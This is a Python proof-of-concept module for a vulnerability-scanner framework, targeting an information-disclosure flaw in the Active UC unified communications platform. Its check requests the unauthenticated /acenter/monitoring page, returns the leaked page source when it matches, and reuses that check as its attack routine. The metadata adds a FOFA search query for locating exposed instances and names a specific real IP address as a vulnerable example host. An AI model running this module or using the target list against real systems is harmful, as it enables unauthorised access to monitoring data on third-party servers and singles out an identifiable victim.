# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "hansi",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2022-01-12",        # POC创建时间
        "UpdateDate" : "2022-01-12",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "网动统一通信平台Active UC存在信息泄露漏洞",                        # 漏洞名称
        "VulnID" : "",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "",                     # 漏洞应用名称
        "AppVersion" : "",                  # 漏洞应用版本
        "VulnDate" : "2022-03-04",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
	
        """,                                # 漏洞简要描述

        "fofa-dork":"""

	title="网动统一通信平台"
        """,                     # fofa搜索语句
        "example" : "http://60.205.143.8/acenter/monitoring",     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    # timeout = 10


    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url = self.target + "/acenter/monitoring" # url自己按需调整

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    #"Content-Type": "application/x-www-form-urlencoded",
                    }

        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            if req.status_code ==200 and "监控系统"in req.text:
                vuln = [True,req.text]
            else:
                vuln = [False,req.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()
